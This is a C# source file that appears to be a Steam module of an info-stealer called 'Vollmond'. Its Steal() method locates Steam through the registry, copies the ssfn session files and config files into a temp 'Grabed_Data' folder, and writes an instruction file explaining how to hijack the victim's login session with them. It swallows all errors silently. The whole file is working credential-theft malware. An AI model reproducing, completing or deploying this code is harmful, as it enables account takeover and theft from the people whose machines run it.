using Microsoft.Win32;

namespace Vollmond.games
{
    internal class Steam
    {
        public static void Steal()
        {
            try
            {
                string SteamPath = GetSteamPath();
                string DataFolderPath = Path.Combine(Path.GetTempPath(), "Grabed_Data", "games", "Steam");

                if (!string.IsNullOrEmpty(SteamPath))
                {
                    Directory.CreateDirectory(DataFolderPath);

                    foreach (string file in Directory.GetFiles(SteamPath)) // ssfn files
                    {
                        if (file.Contains("ssfn"))
                        {
                            File.Copy(file, Path.Combine(DataFolderPath, Path.GetFileName(file)));
                        }
                    }

                    Directory.CreateDirectory(Path.Combine(DataFolderPath, "config"));

                    foreach (string file in Directory.GetFiles(Path.Combine(SteamPath, "config"))) // All files included in folder config (without avatars)
                    {
                        File.Copy(file, Path.Combine(DataFolderPath, "config", Path.GetFileName(file)));
                    }

                    string content = """
                                                ## How to enter a session (the current login session, nothing else)

                                                __It's very simple. Just replace these files in the Steam directory and run steam. That's it!__
                                                """;
                    File.WriteAllText(Path.Combine(DataFolderPath, "INSTRUCTION.md"), content);
                }
            }
            catch { }
        }

        private static string? GetSteamPath()
        {
            try
            {
                RegistryKey stream = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Valve\\Steam");
                string SteamPath = stream.GetValue("SteamPath").ToString();

                return SteamPath;
            }
            catch { return null; }
        }
    }
}
